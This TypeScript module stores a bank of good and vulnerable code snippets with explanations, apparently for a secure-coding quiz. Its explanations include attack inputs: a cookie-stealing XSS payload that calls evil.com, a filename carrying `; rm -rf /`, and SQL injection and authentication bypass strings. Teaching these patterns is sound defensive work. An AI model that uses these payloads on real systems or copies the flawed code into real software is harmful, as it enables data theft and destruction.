export interface Snippet {
  id: string
  snippet: string
  language: 'javascript' | 'python' | 'sql'
  is_good: boolean
  issues: string[]
  explanation: string
  recycled?: boolean
}

const BANK: Omit<Snippet, 'id' | 'recycled'>[] = [
  {
    snippet: `app.get('/user', (req, res) => {
  const id = req.query.id;
  db.query("SELECT * FROM users WHERE id = " + id, (err, rows) => {
    res.json(rows);
  });
});`,
    language: 'javascript',
    is_good: false,
    issues: ['SQL injection via string concatenation'],
    explanation: 'User-controlled `id` is concatenated directly into the SQL query. An attacker can pass `1 OR 1=1` to dump the entire table. Use parameterized queries: `db.query("SELECT * FROM users WHERE id = ?", [id])`.',
  },
  {
    snippet: `function runUserCode(input) {
  return eval(input);
}`,
    language: 'javascript',
    is_good: false,
    issues: ['Arbitrary code execution via eval()'],
    explanation: '`eval()` executes arbitrary JavaScript from user input. An attacker can run `process.exit()`, read files, or exfiltrate data. Never eval user-controlled strings.',
  },
  {
    snippet: `const config = {
  db: 'postgres://admin:password123@prod-db.internal:5432/app',
  apiKey: 'sk-live-abc123xyz',
};`,
    language: 'javascript',
    is_good: false,
    issues: ['Hardcoded credentials in source code'],
    explanation: 'Database password and API key are hardcoded. They end up in git history forever and leak to anyone with repo access. Use environment variables: `process.env.DB_URL` and `process.env.API_KEY`.',
  },
  {
    snippet: `function renderComment(comment) {
  document.getElementById('output').innerHTML = comment;
}`,
    language: 'javascript',
    is_good: false,
    issues: ['XSS via innerHTML'],
    explanation: 'Setting `innerHTML` with unsanitized user content allows XSS. An attacker submits `<script>fetch(evil.com?c=document.cookie)</script>` as a comment. Use `textContent` instead, or sanitize with DOMPurify.',
  },
  {
    snippet: `async function fetchUser(id) {
  try {
    const response = await fetch('/api/users/' + id);
    if (!response.ok) throw new Error('Request failed');
    return await response.json();
  } catch (err) {
    console.error('fetchUser error:', err);
    throw err;
  }
}`,
    language: 'javascript',
    is_good: true,
    issues: [],
    explanation: 'Clean async function with proper error handling. The `try/catch` propagates errors to the caller, the `!response.ok` check handles non-2xx responses, and no user input is interpolated unsafely.',
  },
  {
    snippet: `function getUser(userId) {
  return db.prepare('SELECT id, name, email FROM users WHERE id = ?')
    .get(userId);
}`,
    language: 'javascript',
    is_good: true,
    issues: [],
    explanation: 'Parameterized query with `?` placeholder. The database driver handles escaping — no SQL injection possible regardless of what `userId` contains.',
  },
  {
    snippet: `import os
def get_user(user_id):
    conn = get_db()
    query = "SELECT * FROM users WHERE id = " + str(user_id)
    return conn.execute(query).fetchone()`,
    language: 'python',
    is_good: false,
    issues: ['SQL injection via string concatenation'],
    explanation: '`str(user_id)` is concatenated directly into the SQL string. Pass `user_id` as a parameter instead: `conn.execute("SELECT * FROM users WHERE id = ?", (user_id,))`.',
  },
  {
    snippet: `import os
def run_report(filename):
    os.system("convert " + filename + " output.pdf")`,
    language: 'python',
    is_good: false,
    issues: ['OS command injection via os.system()'],
    explanation: 'User-controlled `filename` is injected into a shell command. An attacker passes `report.txt; rm -rf /` to execute arbitrary commands. Use `subprocess.run(["convert", filename, "output.pdf"])` with a list.',
  },
  {
    snippet: `import hashlib
import os

def create_user(username, password):
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
    store_user(username, salt + key)`,
    language: 'python',
    is_good: true,
    issues: [],
    explanation: 'Password is salted and hashed with PBKDF2 (100k iterations). The random salt prevents rainbow table attacks. Never store plain text or simple MD5/SHA1 hashes.',
  },
  {
    snippet: `def read_config(path):
    with open(path, 'r') as f:
        return json.load(f)`,
    language: 'python',
    is_good: true,
    issues: [],
    explanation: 'Uses context manager (`with`) to ensure the file is closed even if an exception occurs. Clean, idiomatic Python with no injection vectors.',
  },
  {
    snippet: `OPENAI_API_KEY = "sk-prod-abc123"
SECRET_TOKEN = "s3cr3t-jwt-key"

def get_headers():
    return {"Authorization": f"Bearer {OPENAI_API_KEY}"}`,
    language: 'python',
    is_good: false,
    issues: ['Hardcoded API key and secret token'],
    explanation: 'API keys hardcoded in source are committed to version control and visible to all repo contributors. Load from environment: `os.environ["OPENAI_API_KEY"]`.',
  },
  {
    snippet: `import pickle
import base64

def load_session(data):
    return pickle.loads(base64.b64decode(data))`,
    language: 'python',
    is_good: false,
    issues: ['Unsafe deserialization via pickle'],
    explanation: '`pickle.loads()` on untrusted data executes arbitrary Python code during deserialization. An attacker crafts a payload that runs `os.system("rm -rf /")` on load. Use JSON for user-controlled data.',
  },
  {
    snippet: `def get_user(user_id):
    conn = get_db()
    row = conn.execute(
        "SELECT id, name, email FROM users WHERE id = ?",
        (user_id,)
    ).fetchone()
    return dict(row) if row else None`,
    language: 'python',
    is_good: true,
    issues: [],
    explanation: 'Parameterized query with `(user_id,)` tuple. The DB driver escapes the value. Returns `None` on missing user instead of crashing — proper null handling.',
  },
  {
    snippet: `SELECT *
FROM orders
WHERE customer_id = '101' OR '1'='1';`,
    language: 'sql',
    is_good: false,
    issues: ["SQL injection — OR '1'='1' bypasses WHERE filter"],
    explanation: "The condition `'1'='1'` is always true, so this query returns all orders for all customers. This is the classic SQL injection bypass pattern in a raw query.",
  },
  {
    snippet: `DROP TABLE users;
-- run this to clean up test data`,
    language: 'sql',
    is_good: false,
    issues: ['Destructive DDL with no safeguard'],
    explanation: '`DROP TABLE` is irreversible and destroys all data. No transaction, no backup check, no confirmation. In production, this belongs in a migration with a rollback plan.',
  },
  {
    snippet: `SELECT u.id, u.name, o.total
FROM users u
INNER JOIN orders o ON u.id = o.customer_id
WHERE o.created_at > NOW() - INTERVAL '30 days'
  AND o.status = 'completed'
ORDER BY o.total DESC
LIMIT 100;`,
    language: 'sql',
    is_good: true,
    issues: [],
    explanation: 'Parameterized implicit via `NOW()`, explicit `JOIN` condition, filtered columns (no `SELECT *`), and `LIMIT` to prevent full-table scans. Clean, production-safe query.',
  },
  {
    snippet: `CREATE PROCEDURE GetUserByEmail(IN p_email VARCHAR(255))
BEGIN
  SELECT id, name, email
  FROM users
  WHERE email = p_email;
END;`,
    language: 'sql',
    is_good: true,
    issues: [],
    explanation: 'Stored procedure with an `IN` parameter — the database engine parameterizes the value, preventing SQL injection. Only necessary columns are returned, not `SELECT *`.',
  },
  {
    snippet: `async function middleware(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}`,
    language: 'javascript',
    is_good: true,
    issues: [],
    explanation: 'JWT verification uses `process.env.JWT_SECRET` (not hardcoded), handles missing token with 401, and wraps `jwt.verify()` in try-catch to handle expired/tampered tokens.',
  },
  {
    snippet: `def validate_age(age_str):
    age = int(age_str)
    if age < 0 or age > 150:
        raise ValueError("Age must be between 0 and 150")
    return age`,
    language: 'python',
    is_good: true,
    issues: [],
    explanation: 'Input validation with a reasonable bounds check. Raises a typed exception for invalid input rather than silently accepting garbage data. Note: the caller should handle `ValueError` from `int()` on non-numeric input.',
  },
  {
    snippet: `SELECT * FROM users
WHERE username = 'admin' --' AND password = 'anything'`,
    language: 'sql',
    is_good: false,
    issues: ['SQL comment injection bypassing authentication'],
    explanation: "The `--` starts a SQL comment, ignoring the password check entirely. This logs in as any user by knowing only their username. Authentication queries must use parameterized inputs, never string interpolation.",
  },
]

let usedIndices = new Set<number>()

export function getFromFallbackBank(): Snippet & { recycled: boolean } {
  if (usedIndices.size >= BANK.length) usedIndices = new Set()

  const available = BANK.map((_, i) => i).filter((i) => !usedIndices.has(i))
  const idx = available[Math.floor(Math.random() * available.length)]
  usedIndices.add(idx)

  const recycled = usedIndices.size <= BANK.length && usedIndices.size > BANK.length - available.length
  return {
    ...BANK[idx],
    id: `fallback-${idx}`,
    recycled: usedIndices.size === 1 && available.length < BANK.length,
  }
}

export function resetFallbackBank() {
  usedIndices = new Set()
}
